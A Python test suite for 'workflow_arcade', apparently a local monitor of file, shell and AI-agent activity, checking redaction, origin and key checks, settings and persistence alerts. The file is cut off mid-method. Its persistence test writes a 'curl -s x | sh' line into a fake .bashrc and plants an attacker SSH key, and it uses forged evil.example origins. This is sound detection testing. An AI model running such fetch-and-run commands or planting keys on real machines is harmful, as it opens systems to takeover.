import base64
import http.client
import json
import os
import socket
import tempfile
import threading
import time
import unittest
from pathlib import Path

from workflow_arcade.__main__ import HOOKS, check_folder
from workflow_arcade.redact import redact
from workflow_arcade import terminal as term
from workflow_arcade.auth import Owner, issue_pair_code, rotate_key
from workflow_arcade.settings import Settings, SettingsError, defaults, merge
from workflow_arcade.server import Hub, read_session, serve
from workflow_arcade.sources import (
    ClaudeCodeWatcher, CommandWatcher, FileWatcher, SwitchboardWatcher, claude_code_project_dir,
)


def free_port():
    with socket.socket() as s:
        s.bind(("127.0.0.1", 0))
        return s.getsockname()[1]


class RedactTest(unittest.TestCase):
    def test_masks_common_secrets(self):
        cases = [
            "export OPENAI_API_KEY=sk-abcdefghijklmnopqrstuvwx",
            "curl -H 'Authorization: Bearer abcdefghijklmnop' https://x",
            "git clone https://alex:hunter2@github.com/x/y",
            "mysql --password=hunter2",
            "echo ghp_abcdefghijklmnopqrstuvwxyz0123",
        ]
        for c in cases:
            out = redact(c)
            for secret in ("sk-abcdefghijklmnopqrstuvwx", "abcdefghijklmnop", "hunter2", "ghp_abcdefghijklmnopqrstuvwxyz0123"):
                self.assertNotIn(secret, out, c)

    def test_leaves_normal_commands(self):
        for c in ("git commit -m \"Fix bug\"", "python -m pytest -q", "pip install -r requirements.txt"):
            self.assertEqual(redact(c), c)


class FileWatcherTest(unittest.TestCase):
    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp())
        (self.tmp / "a.py").write_text("one\ntwo\n")
        (self.tmp / ".venv").mkdir()
        (self.tmp / ".venv" / "lib.py").write_text("x")
        self.w = FileWatcher(self.tmp)
        self.snap = {f["path"]: f for f in self.w.snapshot()}

    def test_snapshot_skips_library_folders(self):
        self.assertEqual(set(self.snap), {"a.py"})
        self.assertEqual(self.snap["a.py"]["lines"], 2)

    def test_create_change_delete(self):
        (self.tmp / "b.md").write_text("hi\n")
        (self.tmp / "a.py").write_text("one\nTWO\nthree\n")
        evs = {e["path"]: e for e in self.w.poll()}
        self.assertEqual(evs["b.md"]["type"], "file_created")
        self.assertEqual((evs["a.py"]["added"], evs["a.py"]["removed"]), (2, 1))
        (self.tmp / "b.md").unlink()
        evs = self.w.poll()
        self.assertEqual([(e["type"], e["path"]) for e in evs], [("file_deleted", "b.md")])

    def test_secret_files_are_never_read(self):
        (self.tmp / ".env").write_text("API_KEY=supersecret\n")
        ev = self.w.poll()[0]
        self.assertTrue(ev["sensitive"])
        self.assertNotIn("added", ev)
        self.assertNotIn(".env", self.w.lines)

    @unittest.skipIf(os.name == "nt", "symlinks need admin rights on Windows")
    def test_symlinks_are_ignored(self):
        outside = Path(tempfile.mkdtemp()) / "x.txt"
        outside.write_text("outside\n")
        os.symlink(outside, self.tmp / "link.txt")
        self.assertEqual(self.w.poll(), [])


class CommandAndAiTest(unittest.TestCase):
    def test_commands_only_from_project_and_redacted(self):
        proj = Path(tempfile.mkdtemp()).resolve()
        log = Path(tempfile.mkdtemp()) / "commands.log"
        log.write_text("")
        w = CommandWatcher(proj, log)
        with log.open("a") as f:
            f.write(f"1\t{proj}\tgit status\n")
            f.write(f"2\t{tempfile.gettempdir()}\tls elsewhere\n")
            f.write(f"3\t{proj}\texport API_KEY=abc123\n")
        evs = w.poll()
        self.assertEqual([e["cmd"] for e in evs], ["git status", "export API_KEY=•••"])

    def test_ai_calls_with_prices(self):
        log = Path(tempfile.mkdtemp()) / "decisions.jsonl"
        log.write_text("")
        w = SwitchboardWatcher(log, {"big": {"input": 3, "output": 15}})
        recs = [
            {"route": "code", "model": "big", "local": False, "usage": {"prompt_tokens": 1000, "completion_tokens": 100}},
            {"route": "quick", "model": "small", "local": True, "sensitive": ["email"], "usage": None},
        ]
        log.write_text("\n".join(json.dumps(r) for r in recs) + "\nnot json\n")
        evs = w.poll()
        self.assertEqual(evs[0]["cost"], 0.0045)
        self.assertEqual(evs[1]["cost"], 0.0)
        self.assertEqual(evs[1]["sensitive"], ["email"])


class ClaudeCodeWatcherTest(unittest.TestCase):
    def setUp(self):
        self.root = Path(tempfile.mkdtemp()).resolve()
        self.claude_home = Path(tempfile.mkdtemp())

    def test_project_dir_encoding(self):
        got = claude_code_project_dir(Path("/home/alexb/projects/hello-test"), self.claude_home)
        self.assertEqual(got, self.claude_home / "projects" / "-home-alexb-projects-hello-test")
        got = claude_code_project_dir(Path("/home/alexb/Workflow Arcade/my.app"), self.claude_home)
        self.assertEqual(got.name, "-home-alexb-Workflow-Arcade-my-app")

    def test_subagents_and_synthetic_messages(self):
        proj_dir = claude_code_project_dir(self.root, self.claude_home)
        (proj_dir / "s1" / "subagents").mkdir(parents=True)
        w = ClaudeCodeWatcher(self.root, self.claude_home)
        self._write_turn(proj_dir / "s1" / "subagents" / "agent-a.jsonl", "msg_a", "claude-haiku-5-5", ["text"], 7)
        self._write_turn(proj_dir / "s1.jsonl", "msg_s", "<synthetic>", ["text"], 0)
        evs = w.poll()
        self.assertEqual([(e["route"], e["model"]) for e in evs], [("claude-code (subagent)", "claude-haiku-5-5")])
        self.assertEqual(evs[0]["tokens_cached"], 50)

    def test_unavailable_when_no_transcripts_yet(self):
        w = ClaudeCodeWatcher(self.root, self.claude_home)
        self.assertFalse(w.available())
        self.assertEqual(w.poll(), [])

    def _write_turn(self, log: Path, msg_id: str, model: str, content_types: list[str], out_tokens: int):
        usage = {"input_tokens": 5, "cache_creation_input_tokens": 100, "cache_read_input_tokens": 50,
                  "output_tokens": out_tokens}
        with log.open("a") as f:
            for ct in content_types:
                rec = {"type": "assistant", "message": {"id": msg_id, "model": model,
                       "content": [{"type": ct}], "usage": usage}}
                f.write(json.dumps(rec) + "\n")

    def test_dedupes_split_turns_and_skips_history(self):
        proj_dir = claude_code_project_dir(self.root, self.claude_home)
        proj_dir.mkdir(parents=True)
        log = proj_dir / "session1.jsonl"
        log.write_text("")
        self._write_turn(log, "msg_1", "claude-opus-5-5", ["thinking"], 500)  # pre-existing, not watched

        w = ClaudeCodeWatcher(self.root, self.claude_home)
        self.assertTrue(w.available())
        self.assertEqual(w.poll(), [])  # history before the watch started is not replayed

        self._write_turn(log, "msg_2", "claude-opus-5-5", ["thinking", "text"], 266)
        evs = w.poll()
        self.assertEqual(len(evs), 1)  # one event per message id, not per content block
        ev = evs[0]
        self.assertEqual(ev["type"], "ai_call")
        self.assertEqual(ev["route"], "claude-code")
        self.assertEqual(ev["model"], "claude-opus-5-5")
        self.assertFalse(ev["local"])
        self.assertTrue(ev["subscription"])
        self.assertIsNone(ev["cost"])
        self.assertEqual(ev["tokens_in"], 5 + 100 + 50)
        self.assertEqual(ev["tokens_out"], 266)

    def test_new_session_file_is_read_from_its_start(self):
        proj_dir = claude_code_project_dir(self.root, self.claude_home)
        proj_dir.mkdir(parents=True)
        w = ClaudeCodeWatcher(self.root, self.claude_home)
        log = proj_dir / "session2.jsonl"
        log.write_text("")
        self._write_turn(log, "msg_1", "claude-sonnet-5", ["text"], 10)
        evs = w.poll()
        self.assertEqual([e["model"] for e in evs], ["claude-sonnet-5"])

    def test_ignores_non_assistant_lines(self):
        proj_dir = claude_code_project_dir(self.root, self.claude_home)
        proj_dir.mkdir(parents=True)
        log = proj_dir / "session3.jsonl"
        log.write_text("")
        w = ClaudeCodeWatcher(self.root, self.claude_home)
        with log.open("a") as f:
            f.write(json.dumps({"type": "user", "message": {"content": "hi"}}) + "\n")
            f.write("not json\n")
        self.assertEqual(w.poll(), [])


class TailTest(unittest.TestCase):
    def test_skips_a_line_longer_than_one_read(self):
        log = Path(tempfile.mkdtemp()) / "t.jsonl"
        log.write_text("")
        from workflow_arcade.sources import READ_MAX, Tail
        t = Tail(log)
        with log.open("a") as f:
            f.write("x" * (READ_MAX + 10) + "\n" + '{"ok": 1}\n')
        got = []
        for _ in range(4):
            got += t.lines()
        self.assertEqual(got, ['{"ok": 1}'])


class SwitchboardDetailsTest(unittest.TestCase):
    def test_reasons_and_budget_blocks_are_carried(self):
        log = Path(tempfile.mkdtemp()) / "decisions.jsonl"
        log.write_text("")
        w = SwitchboardWatcher(log, {})
        rec = {"route": "code", "model": "coder", "local": True, "status": 200,
               "reasons": ["keywords matched route code (score 2)", "x" * 500],
               "failed_attempts": [{"model": "big", "error": "budget_blocked", "reason": "daily cap reached"},
                                   {"model": "gpt", "status": 503}, "weird"]}
        log.write_text(json.dumps(rec) + "\n")
        [ev] = w.poll()
        self.assertEqual(ev["reasons"][0], "keywords matched route code (score 2)")
        self.assertLessEqual(len(ev["reasons"][1]), 160)
        self.assertEqual(ev["attempts"][0], {"model": "big", "error": "budget_blocked", "reason": "daily cap reached"})
        self.assertEqual(ev["attempts"][1], {"model": "gpt", "status": 503})
        self.assertEqual(ev["attempts"][2], {"model": "weird"})


class WsClient:
    """Just enough of a browser WebSocket to test the terminal endpoint."""
    open: list = []

    def __init__(self, port, origin=None, host=None):
        self.sock = socket.create_connection(("127.0.0.1", port), timeout=5)
        WsClient.open.append(self)
        origin = origin or f"http://127.0.0.1:{port}"
        req = (f"GET /api/term HTTP/1.1\r\nHost: {host or f'127.0.0.1:{port}'}\r\nUpgrade: websocket\r\n"
               f"Connection: Upgrade\r\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n"
               f"Sec-WebSocket-Version: 13\r\nOrigin: {origin}\r\n\r\n")
        self.sock.sendall(req.encode())
        self.f = self.sock.makefile("rb")
        self.status = int(self.f.readline().split()[1])
        while self.f.readline() not in (b"\r\n", b""):
            pass

    def send(self, op, data: bytes):
        mask = os.urandom(4)
        n = len(data)
        head = bytes([0x80 | op]) + (bytes([0x80 | n]) if n < 126 else bytes([0x80 | 126]) + n.to_bytes(2, "big"))
        self.sock.sendall(head + mask + bytes(b ^ mask[i % 4] for i, b in enumerate(data)))

    def hello(self, **msg):
        self.send(term.OP_TEXT, json.dumps({"size": [80, 24], **msg}).encode())

    def recv(self):
        b1, b2 = self.f.read(2)
        n = b2 & 0x7F
        if n == 126:
            n = int.from_bytes(self.f.read(2), "big")
        elif n == 127:
            n = int.from_bytes(self.f.read(8), "big")
        return b1 & 0x0F, self.f.read(n)

    def read_until(self, needle: bytes, limit=5.0):
        out, end = b"", time.time() + limit
        while needle not in out and time.time() < end:
            op, data = self.recv()
            if op == term.OP_CLOSE:
                break
            if op == term.OP_BIN:
                out += data
        return out


@unittest.skipUnless(term.supported(), "pty needs Linux or macOS")
class TerminalTest(unittest.TestCase):
    def setUp(self):
        self.root = Path(tempfile.mkdtemp())
        self.port = free_port()
        self.owner = Owner(Path(tempfile.mkdtemp()))
        self.shell = term.Terminal(self.root, self.owner)
        self.httpd = serve(Hub("demo", [], None, {}), Path(tempfile.mkdtemp()), self.port, self.shell, self.owner)
        threading.Thread(target=self.httpd.serve_forever, daemon=True).start()

    def tearDown(self):
        for c in WsClient.open:
            c.f.close(), c.sock.close()
        WsClient.open.clear()
        self.httpd.shutdown()
        self.httpd.server_close()

    def test_foreign_origin_and_host_are_refused(self):
        self.assertEqual(WsClient(self.port, origin="https://evil.example").status, 403)
        self.assertEqual(WsClient(self.port, origin="null").status, 403)
        self.assertEqual(WsClient(self.port, host="evil.example").status, 403)

    def test_wrong_token_is_closed(self):
        ws = WsClient(self.port)
        self.assertEqual(ws.status, 101)
        ws.hello(key="guess")
        op, data = ws.recv()
        self.assertEqual(op, term.OP_CLOSE)
        self.assertEqual(int.from_bytes(data[:2], "big"), 1008)

    def test_owner_key_runs_a_real_shell(self):
        ws = WsClient(self.port)
        ws.hello(key=self.owner.key)
        ws.send(term.OP_BIN, b"echo arcade-$((40+2))\n")
        self.assertIn(b"arcade-42", ws.read_until(b"arcade-42"))
        ws.send(term.OP_BIN, b"pwd\n")  # macOS may print /var/... or /private/var/...: match the unique part
        self.assertIn(self.root.name.encode(), ws.read_until(self.root.name.encode()))

        old = WsClient(self.port)  # the pairing code is no key: the shell refuses it
        old.hello(key=self.owner.launch_code())
        self.assertEqual(old.recv()[0], term.OP_CLOSE)

    def test_shell_exit_is_reported(self):
        ws = WsClient(self.port)
        ws.hello(key=self.owner.key)
        ws.send(term.OP_BIN, b"exit 3\n")
        while True:
            op, data = ws.recv()
            if op == term.OP_TEXT:
                self.assertEqual(json.loads(data), {"exit": 3})
                break

    def test_off_by_default(self):
        port = free_port()
        httpd = serve(Hub("demo", [], None, {}), Path(tempfile.mkdtemp()), port)
        threading.Thread(target=httpd.serve_forever, daemon=True).start()
        try:
            self.assertEqual(WsClient(port).status, 404)
        finally:
            httpd.shutdown()
            httpd.server_close()

    def test_vendor_files_only_from_allowlist(self):
        c = http.client.HTTPConnection("127.0.0.1", self.port, timeout=5)
        c.request("GET", "/static/vendor/xterm.js", headers={"Host": f"127.0.0.1:{self.port}"})
        r = c.getresponse()
        self.assertEqual(r.status, 200)
        self.assertIn(b"Terminal", r.read())
        c.request("GET", "/static/vendor/README.md", headers={"Host": f"127.0.0.1:{self.port}"})
        r = c.getresponse(); r.read()
        self.assertEqual(r.status, 404)
        c.close()


class OwnerTest(unittest.TestCase):
    def setUp(self):
        self.home = Path(tempfile.mkdtemp())
        self.owner = Owner(self.home)

    def test_key_is_private_and_survives_restarts(self):
        self.assertGreaterEqual(len(self.owner.key), 40)
        if os.name == "posix":
            self.assertEqual((self.home / "owner.key").stat().st_mode & 0o777, 0o600)
        self.assertEqual(Owner(self.home).key, self.owner.key)

    def test_codes_work_once(self):
        code = self.owner.launch_code()
        self.assertEqual(self.owner.redeem(code), self.owner.key)
        self.assertIsNone(self.owner.redeem(code))
        code = issue_pair_code(self.home)  # what `pair` does, for a running server
        self.assertEqual(self.owner.redeem(code), self.owner.key)
        self.assertIsNone(self.owner.redeem(code))
        self.assertFalse((self.home / "pair").exists())
        self.assertIsNone(self.owner.redeem(None))
        self.assertIsNone(self.owner.redeem("x" * 500))

    def test_codes_expire(self):
        code = issue_pair_code(self.home)
        old = time.time() - 3600
        os.utime(self.home / "pair", (old, old))
        self.assertIsNone(self.owner.redeem(code))

    def test_rotate_unpairs_without_restart(self):
        before = self.owner.key
        rotate_key(self.home)
        self.assertFalse(self.owner.check(before))
        self.assertTrue(self.owner.check(self.owner.key))


class SettingsTest(unittest.TestCase):
    def setUp(self):
        self.path = Path(tempfile.mkdtemp()) / "settings.json"
        self.s = Settings(self.path)

    def test_defaults_then_partial_update_is_saved(self):
        self.assertEqual(self.s.data, defaults())
        data, restart = self.s.update({"look": {"mode": "dark", "background": {"type": "particles"}}})
        self.assertEqual(data["look"]["mode"], "dark")
        self.assertEqual(data["look"]["background"]["type"], "particles")
        self.assertEqual(data["look"]["palette"], "neutral")  # untouched fields keep their value
        self.assertFalse(restart)
        self.assertEqual(Settings(self.path).data, data)
        if os.name == "posix":
            self.assertEqual(self.path.stat().st_mode & 0o777, 0o600)

    def test_server_options_need_restart(self):
        self.assertTrue(self.s.update({"features": {"terminal": True}})[1])

    def test_rejects_bad_values_without_partial_writes(self):
        cases = [
            {"nope": 1}, {"look": {"mode": "neon"}}, {"look": {"font_size": 99}}, {"look": {"accent": "red"}},
            {"look": {"accent": "#12345g"}}, {"layout": {"views": ["live"]}},
            {"layout": {"hidden": ["live", "replay", "learn", "details", "terminal", "alerts"]}},
            {"look": {"animations": "yes"}}, {"look": "dark"}, {"look": {"radius": True}},
            {"look": {"background": {"colors": ["#000000"] * 4}}},
        ]
        for bad in cases:
            with self.assertRaises(SettingsError, msg=bad):
                self.s.update(bad)
        self.assertEqual(self.s.data, defaults())
        self.assertFalse(self.path.exists())

    def test_damaged_file_falls_back_per_field(self):
        self.path.write_text(json.dumps({"look": {"mode": "dark", "font_size": 500}, "junk": 1}))
        data = Settings(self.path).data
        self.assertEqual(data["look"]["mode"], "dark")
        self.assertEqual(data["look"]["font_size"], 15)
        self.path.write_text("not json")
        self.assertEqual(Settings(self.path).data, defaults())

    def test_page_defaults_match_the_schema(self):
        """The page carries its own copy of the defaults (for the demo and the first paint)."""
        import re
        from importlib import resources
        page = resources.files("workflow_arcade").joinpath("static/index.html").read_text(encoding="utf-8")
        embedded = re.search(r"/\*DEFAULTS\*/(.*?)/\*END\*/", page, re.S).group(1)
        self.assertEqual(json.loads(embedded), defaults())

    def test_merge_reports_where(self):
        with self.assertRaisesRegex(SettingsError, "look.background.angle"):
            merge(defaults(), {"look": {"background": {"angle": 999}}})


class WriteApiTest(unittest.TestCase):
    """Every change needs: our Host, our Origin, JSON, and the owner key."""

    def setUp(self):
        self.home = Path(tempfile.mkdtemp())
        self.port = free_port()
        self.owner = Owner(self.home)
        self.settings = Settings(self.home / "settings.json")
        self.restarted = threading.Event()
        self.httpd = serve(Hub("demo", [], None, {}), self.home, self.port, None, self.owner, self.settings,
                           self.restarted.set)
        threading.Thread(target=self.httpd.serve_forever, daemon=True).start()

    def tearDown(self):
        self.httpd.shutdown()
        self.httpd.server_close()

    def post(self, path, body, key=None, origin=None, ctype="application/json", host=None):
        c = http.client.HTTPConnection("127.0.0.1", self.port, timeout=5)
        data = body if isinstance(body, bytes) else json.dumps(body).encode()
        headers = {"Host": host or f"127.0.0.1:{self.port}", "Origin": origin or f"http://127.0.0.1:{self.port}",
                   "Content-Type": ctype, "Content-Length": str(len(data))}
        if key:
            headers["X-Arcade-Key"] = key
        c.request("POST", path, body=data, headers=headers)
        r = c.getresponse()
        out = (r.status, json.loads(r.read() or b"{}"))
        c.close()
        return out

    def test_pair_then_change_settings(self):
        status, body = self.post("/api/pair", {"code": self.owner.launch_code()})
        self.assertEqual(status, 200)
        key = body["key"]
        self.assertEqual(self.post("/api/ping", {}, key=key)[0], 200)
        status, body = self.post("/api/settings", {"change": {"layout": {"nav_position": "left"}}}, key=key)
        self.assertEqual(status, 200)
        self.assertEqual(body["settings"]["layout"]["nav_position"], "left")
        self.assertEqual(Settings(self.home / "settings.json").data["layout"]["nav_position"], "left")
        status, body = self.post("/api/settings", {"change": {"layout": {"nav_position": "diagonal"}}}, key=key)
        self.assertEqual(status, 400)
        self.assertIn("layout.nav_position", body["error"])

    def test_refusals(self):
        key = self.owner.key
        change = {"change": {"look": {"mode": "dark"}}}
        self.assertEqual(self.post("/api/settings", change)[0], 401)                        # no key
        self.assertEqual(self.post("/api/settings", change, key="x" * 43)[0], 401)          # wrong key
        self.assertEqual(self.post("/api/settings", change, key=key, origin="https://evil.example")[0], 403)
        self.assertEqual(self.post("/api/settings", change, key=key, origin="null")[0], 403)
        self.assertEqual(self.post("/api/settings", change, key=key, host="evil.example")[0], 403)
        self.assertEqual(self.post("/api/settings", change, key=key, ctype="text/plain")[0], 415)  # simple CORS request
        self.assertEqual(self.post("/api/settings", b"x" * 70000, key=key)[0], 413)
        self.assertEqual(self.post("/api/settings", b"{not json", key=key)[0], 400)
        self.assertEqual(self.post("/api/pair", {"code": "guess"})[0], 403)
        self.assertEqual(self.post("/api/state", {}, key=key)[0], 405)
        self.assertEqual(self.settings.data["look"]["mode"], "system")  # nothing got through

    def test_restart_needs_key(self):
        self.assertEqual(self.post("/api/restart", {})[0], 401)
        self.assertFalse(self.restarted.is_set())
        self.assertEqual(self.post("/api/restart", {}, key=self.owner.key)[0], 202)
        self.assertTrue(self.restarted.wait(2))

    def test_settings_are_readable(self):
        c = http.client.HTTPConnection("127.0.0.1", self.port, timeout=5)
        c.request("GET", "/api/settings", headers={"Host": f"127.0.0.1:{self.port}"})
        r = c.getresponse()
        self.assertEqual(json.loads(r.read())["settings"], defaults())
        c.close()


class AutostartTest(unittest.TestCase):
    def test_unit_is_hardened_and_quotes_paths(self):
        from workflow_arcade import autostart as a
        unit = a.render_unit(Path("/home/me/My Project"), 8790)
        self.assertIn("ExecStart=", unit)
        self.assertIn("'/home/me/My Project' --no-open --port 8790", unit)
        for rule in ("UMask=0077", "NoNewPrivileges=true", "Restart=on-failure"):
            self.assertIn(rule, unit)
        self.assertNotIn("--terminal", unit)  # the terminal follows Settings, never the login item

    def test_plist_escapes(self):
        from workflow_arcade import autostart as a
        plist = a.render_plist(Path("/Users/me/a&b"), 8788, Path("/tmp/log"))
        self.assertIn("<string>/Users/me/a&amp;b</string>", plist)

    def test_status_reads_systemd_without_changing_anything(self):
        from workflow_arcade import autostart as a
        calls = []

        def fake(*args, timeout=15):
            calls.append(args)
            if args[:3] == ("systemctl", "--user", "show"):
                return 0, ("UnitFileState=enabled\nActiveState=active\nSubState=running\nMainPID=42\n"
                           "ActiveEnterTimestamp=Sun 2026-10-12 09:00:00 CEST\nFragmentPath=")
            if args[0] == "journalctl":
                return 0, "line1\nline2"
            return 1, ""
        orig_run, orig_sys = a._run, a.system
        a._run, a.system = fake, (lambda: "linux")
        try:
            st = a.status(Path(tempfile.mkdtemp()))
        finally:
            a._run, a.system = orig_run, orig_sys
        arcade = st["services"][0]
        self.assertTrue(arcade["enabled"] and arcade["active"])
        self.assertEqual(arcade["pid"], 42)
        self.assertEqual(arcade["logs"], ["line1", "line2"])
        self.assertTrue(all(c[0] in ("systemctl", "journalctl") and c[2] in ("show", "-u") for c in calls))

    def test_endpoint_is_owner_only(self):
        home = Path(tempfile.mkdtemp())
        port = free_port()
        owner = Owner(home)
        httpd = serve(Hub("demo", [], None, {}), home / "sessions", port, None, owner, Settings(home / "s.json"))
        threading.Thread(target=httpd.serve_forever, daemon=True).start()
        try:
            c = http.client.HTTPConnection("127.0.0.1", port, timeout=10)
            hdr = {"Host": f"127.0.0.1:{port}", "Origin": f"http://127.0.0.1:{port}",
                   "Content-Type": "application/json", "Content-Length": "2"}
            c.request("POST", "/api/autostart", body=b"{}", headers=hdr)
            r = c.getresponse(); r.read()
            self.assertEqual(r.status, 401)
            c.request("POST", "/api/autostart", body=b"{}", headers={**hdr, "X-Arcade-Key": owner.key})
            r = c.getresponse()
            self.assertEqual(r.status, 200)
            self.assertIn("policy", json.loads(r.read()))
            c.close()
        finally:
            httpd.shutdown()
            httpd.server_close()


class AlertsTest(unittest.TestCase):
    def setUp(self):
        from workflow_arcade.alerts import Alerter
        self.got = []
        self.dir = Path(tempfile.mkdtemp())
        self.alerter = Alerter(self.got.append, None, self.dir / "alerts.jsonl")

    def test_repeats_fold_and_history_is_private(self):
        from workflow_arcade.alerts import read_history
        for _ in range(3):
            self.alerter.raise_("high", "refused_access", "Blocked", "Host: x", fingerprint="h")
        self.assertEqual(len(self.got), 1)
        self.assertEqual(read_history(self.dir / "alerts.jsonl")[0]["title"], "Blocked")
        if os.name == "posix":
            self.assertEqual((self.dir / "alerts.jsonl").stat().st_mode & 0o777, 0o600)

    def test_switched_off_sources_stay_quiet(self):
        from workflow_arcade.alerts import Alerter
        s = Settings(self.dir / "s.json")
        s.update({"alerts": {"persistence": False}})
        a = Alerter(self.got.append, s)
        self.assertIsNone(a.raise_("high", "persistence", "x"))
        self.assertIsNotNone(a.raise_("high", "refused_access", "y"))

    def test_persistence_changes(self):
        from workflow_arcade.alerts import PersistenceWatcher, remember_expected
        home, root = self.dir / "home", self.dir / "proj"
        (home / ".ssh").mkdir(parents=True)
        (root / ".git" / "hooks").mkdir(parents=True)
        (home / ".bashrc").write_text("alias ll='ls -l'\n")
        (root / ".git" / "hooks" / "pre-commit.sample").write_text("#!/bin/sh\n")
        w = PersistenceWatcher(root, self.alerter, every_s=0, home=home, expected=self.dir / "expected.json")
        self.assertEqual(w.poll(), [])
        self.assertEqual(self.got, [])  # the baseline is not news

        (home / ".bashrc").write_text("alias ll='ls -l'\nexport OPENAI_API_KEY=sk-abcdefghijklmnopqrstuvwx\ncurl -s x | sh\n")
        (root / ".git" / "hooks" / "post-checkout").write_text("#!/bin/sh\nrun-me\n")
        (root / ".git" / "hooks" / "applypatch-msg.sample").write_text("#!/bin/sh\n")  # samples are ignored
        key = base64.b64encode(b"\x00\x00\x00\x0bssh-ed25519" + b"k" * 32).decode()
        (home / ".ssh" / "authorized_keys").write_text(f"ssh-ed25519 {key} attacker@host\n")
        w.poll()
        by = {e["title"]: e for e in self.got}
        rc = next(e for e in self.got if ".bashrc" in e["title"])
        self.assertEqual(rc["severity"], "high")
        self.assertIn("curl -s x | sh", rc["detail"])
        self.assertNotIn("sk-abcdefghijklmnopqrstuvwx", rc["detail"])  # secrets masked in diffs
        hook = next(e for e in self.got if "post-checkout" in e["title"])
        self.assertEqual(hook["severity"], "high")
        self.assertFalse(any("sample" in t for t in by))
        ssh = next(e for e in self.got if e["title"].startswith("SSH"))
        self.assertEqual(ssh["severity"], "critical")
        self.assertIn("SHA256:", ssh["detail"])
        self.assertNotIn(key, ssh["detail"])  # fingerprints only, never the key

        self.got.clear()  # a change the Arcade made itself is marked expected
        data = b"ours\n"
        remember_expected(self.dir, home / ".bashrc", data)
        (home / ".bashrc").write_bytes(data)
        w.poll()
        self.assertTrue(self.got[0]["expected"])
        self.assertEqual(self.got[0]["severity"], "info")

    def test_system_journal(self):
        from workflow_arcade.alerts import SystemLogWatcher
        lines = []

        def runner(args):
            return "\n".join(json.dumps(x) for x in lines)
        if not SystemLogWatcher(self.alerter, runner=runner).available:
            self.skipTest("Linux only")
        w = SystemLogWatcher(self.alerter, every_s=0, runner=runner)
        lines[:] = [
            {"__CURSOR": "c1", "SYSLOG_IDENTIFIER": "sudo", "MESSAGE": "alexb : TTY=pts/1 ; PWD=/home/alexb ; USER=root ; COMMAND=/usr/bin/apt update"},
            {"__CURSOR": "c2", "SYSLOG_IDENTIFIER": "sudo", "MESSAGE": "alexb : 3 incorrect password attempts ; TTY=pts/1"},
            {"__CURSOR": "c3", "SYSLOG_IDENTIFIER": "sshd-session", "MESSAGE": "Accepted publickey for alexb from 10.0.0.9 port 51515 ssh2"},
            {"__CURSOR": "c4", "SYSLOG_IDENTIFIER": "systemd-logind", "MESSAGE": "New session 12 of user alexb."},
        ]
        w.poll()
        self.assertEqual([e["severity"] for e in self.got], ["medium", "high", "high", "info"])
        self.assertEqual(self.got[0]["detail"], "/usr/bin/apt update")
        self.assertEqual(w.cursor, "c4")

    def test_switchboard_refusals(self):
        from workflow_arcade.alerts import SwitchboardSecurityWatcher
        log = self.dir / "security.jsonl"
        log.write_text("")
        w = SwitchboardSecurityWatcher(log, self.alerter)
        with log.open("a") as f:
            f.write(json.dumps({"method": "POST", "path": "/v1/chat/completions", "client": "192.168.1.5", "reason": "invalid or missing API key"}) + "\n")
        w.poll()
        self.assertEqual(self.got[0]["severity"], "high")  # not from this computer

    def test_ai_commands_from_claude_code(self):
        root = Path(tempfile.mkdtemp()).resolve()
        claude_home = Path(tempfile.mkdtemp())
        d = claude_code_project_dir(root, claude_home)
        d.mkdir(parents=True)
        log = d / "s.jsonl"
        log.write_text("")
        w = ClaudeCodeWatcher(root, claude_home)
        rec = {"type": "assistant", "cwd": str(root), "message": {"id": "m1", "model": "claude-x", "usage": {"input_tokens": 1, "output_tokens": 1},
               "content": [{"type": "tool_use", "id": "toolu_1", "name": "Bash",
                            "input": {"command": "export TOKEN=abcdefghijklmnop123 && rm -rf build", "description": "Clean the build"}}]}}
        log.write_text(json.dumps(rec) + "\n" + json.dumps(rec) + "\n")
        evs = w.poll()
        cmds = [e for e in evs if e["type"] == "command"]
        self.assertEqual(len(cmds), 1)  # the same tool call twice counts once
        self.assertEqual((cmds[0]["actor"], cmds[0]["cwd"], cmds[0]["why"]), ("ai", ".", "Clean the build"))
        self.assertNotIn("abcdefghijklmnop123", cmds[0]["cmd"])
        self.assertIn("rm -rf build", cmds[0]["cmd"])

    def test_refused_requests_raise_alerts_and_acks_need_the_key(self):
        from workflow_arcade.alerts import Acks
        from workflow_arcade.server import AlertsContext
        home = Path(tempfile.mkdtemp())
        port = free_port()
        owner = Owner(home)
        hub = Hub("demo", [], None, {})
        from workflow_arcade.alerts import Alerter
        alerter = Alerter(hub.publish, None, home / "alerts.jsonl")
        ctx = AlertsContext(alerter, home / "alerts.jsonl", Acks(home / "acks.json"), lambda: {"available": False, "why": "test"})
        httpd = serve(hub, home, port, None, owner, Settings(home / "s.json"), None, ctx)
        threading.Thread(target=httpd.serve_forever, daemon=True).start()
        try:
            c = http.client.HTTPConnection("127.0.0.1", port, timeout=5)
            hdr = {"Host": f"127.0.0.1:{port}", "Origin": "https://evil.example", "Content-Type": "application/json", "Content-Length": "2"}
            c.request("POST", "/api/settings", body=b"{}", headers=hdr); c.getresponse().read()
            c.request("GET", "/", headers={"Host": "rebind.example:8788"}); c.getresponse().read()
            titles = [e["title"] for e in hub.events if e["type"] == "alert"]
            self.assertIn("A web page tried to change the Arcade", titles)
            self.assertIn("Blocked a request for another host name", titles)
            c.request("GET", "/api/alerts", headers={"Host": f"127.0.0.1:{port}"})
            got = json.loads(c.getresponse().read())
            self.assertEqual(len(got["alerts"]), 2)
            uid = got["alerts"][0]["uid"]
            ok = {**hdr, "Origin": f"http://127.0.0.1:{port}"}
            body = json.dumps({"ids": [uid]}).encode()
            c.request("POST", "/api/alerts/ack", body=body, headers={**ok, "Content-Length": str(len(body))})
            self.assertEqual(c.getresponse().status, 401)
            c.request("POST", "/api/alerts/ack", body=body, headers={**ok, "Content-Length": str(len(body)), "X-Arcade-Key": owner.key})
            r = c.getresponse()
            self.assertEqual(json.loads(r.read())["acks"], [uid])
            c.close()
        finally:
            httpd.shutdown()
            httpd.server_close()


class ServerTest(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.home = Path(tempfile.mkdtemp())
        cls.port = free_port()
        session = cls.home / "20260101-120000-demo.jsonl"
        cls.hub = Hub("demo", [{"path": "a.py", "size": 1}], session, {})
        cls.httpd = serve(cls.hub, cls.home, cls.port)
        threading.Thread(target=cls.httpd.serve_forever, daemon=True).start()

    @classmethod
    def tearDownClass(cls):
        cls.httpd.shutdown()

    def get(self, path, host=None, method="GET"):
        c = http.client.HTTPConnection("127.0.0.1", self.port, timeout=5)
        c.request(method, path, headers={"Host": host or f"127.0.0.1:{self.port}"})
